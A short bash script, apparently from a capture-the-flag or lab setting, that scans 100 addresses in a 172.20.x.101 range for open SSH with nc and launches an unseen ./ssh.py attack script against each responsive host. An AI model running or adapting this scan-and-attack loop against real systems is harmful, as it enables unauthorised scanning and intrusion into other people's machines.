#!/bin/bash

for i in `seq 101 200`
do
ip="172.20.$i.101"
echo "Attack 22 $ip..."
a=`nc -z -w1 $ip 22`
if [ "$?" == "0" ]
then 
./ssh.py -H $ip
fi
done
